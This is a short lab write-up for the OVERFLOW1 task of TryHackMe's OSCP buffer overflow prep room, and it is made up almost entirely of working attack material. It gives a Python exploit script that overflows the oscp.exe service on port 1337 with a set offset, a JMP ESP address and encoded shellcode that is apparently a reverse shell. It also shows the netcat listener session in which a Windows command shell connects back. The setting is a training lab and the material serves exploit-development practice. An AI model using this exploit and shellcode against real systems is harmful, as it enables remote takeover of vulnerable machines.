# OSCP - BOF - Prep (TryHackMe)

Buffer Overflow preparation room (by Tib3rius) of TryHackMe platform.

### oscp.exe - OVERFLOW1

```py
#!/usr/bin/python
import socket

ip = "<ip>"
port = 1337

prefix = "OVERFLOW1 "

offset = 1978
overflow = "A"*offset
jmp = "\xAF\x11\x50\x62"

shellcode = ("\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\xac\xe5\xca\x95\x83\xee\xfc\xe2\xf4\x50\x0d\x48\x95\xac\xe5"
"\xaa\x1c\x49\xd4\x0a\xf1\x27\xb5\xfa\x1e\xfe\xe9\x41\xc7\xb8"
"\x6e\xb8\xbd\xa3\x52\x80\xb3\x9d\x1a\x66\xa9\xcd\x99\xc8\xb9"
"\x8c\x24\x05\x98\xad\x22\x28\x67\xfe\xb2\x41\xc7\xbc\x6e\x80"
"\xa9\x27\xa9\xdb\xed\x4f\xad\xcb\x44\xfd\x6e\x93\xb5\xad\x36"
"\x41\xdc\xb4\x06\xf0\xdc\x27\xd1\x41\x94\x7a\xd4\x35\x39\x6d"
"\x2a\xc7\x94\x6b\xdd\x2a\xe0\x5a\xe6\xb7\x6d\x97\x98\xee\xe0"
"\x48\xbd\x41\xcd\x88\xe4\x19\xf3\x27\xe9\x81\x1e\xf4\xf9\xcb"
"\x46\x27\xe1\x41\x94\x7c\x6c\x8e\xb1\x88\xbe\x91\xf4\xf5\xbf"
"\x9b\x6a\x4c\xba\x95\xcf\x27\xf7\x21\x18\xf1\x8d\xf9\xa7\xac"
"\xe5\xa2\xe2\xdf\xd7\x95\xc1\xc4\xa9\xbd\xb3\xab\x1a\x1f\x2d"
"\x3c\xe4\xca\x95\x85\x21\x9e\xc5\xc4\xcc\x4a\xfe\xac\x1a\x1f"
"\xc5\xfc\xb5\x9a\xd5\xfc\xa5\x9a\xfd\x46\xea\x15\x75\x53\x30"
"\x5d\xff\xa9\x8d\xc0\x9d\xcd\x27\xa2\x97\xac\xe5\xff\x1c\x4a"
"\x8f\xda\xc3\xfb\x8d\x53\x30\xd8\x84\x35\x40\x29\x25\xbe\x99"
"\x53\xab\xc2\xe0\x40\x8d\x3a\x20\x0e\xb3\x35\x40\xc4\x86\xa7"
"\xf1\xac\x6c\x29\xc2\xfb\xb2\xfb\x63\xc6\xf7\x93\xc3\x4e\x18"
"\xac\x52\xe8\xc1\xf6\x94\xad\x68\x8e\xb1\xbc\x23\xca\xd1\xf8"
"\xb5\x9c\xc3\xfa\xa3\x9c\xdb\xfa\xb3\x99\xc3\xc4\x9c\x06\xaa"
"\x2a\x1a\x1f\x1c\x4c\xab\x9c\xd3\x53\xd5\xa2\x9d\x2b\xf8\xaa"
"\x6a\x79\x5e\x3a\x20\x0e\xb3\xa2\x33\x39\x58\x57\x6a\x79\xd9"
"\xcc\xe9\xa6\x65\x31\x75\xd9\xe0\x71\xd2\xbf\x97\xa5\xff\xac"
"\xb6\x35\x40")

# Badchars of mona: "\x00\x01\x02\x03\x04\x07\x08\x2e\x2f\xa0\xa1"
# Manual guessing Badchars: "\x00\x07\x2e\xa0"

try:
  print "\nSending evil buffer..."

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)

  s.connect((ip, port))
  s.send(prefix + overflow + jmp + shellcode)

  s.close()

  print "\nDone!"

except:
  print "\nCould not connect!"
```
```sh
┌──(kali㉿kali)-[~]
└─$ sudo rlwrap nc -lnvp 53                                                                         
[sudo] password for kali: 
listening on [any] 53 ...
connect to [<ip>] from (UNKNOWN) [10.10.25.204] 49250
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\admin\Desktop\vulnerable-apps\oscp>
```
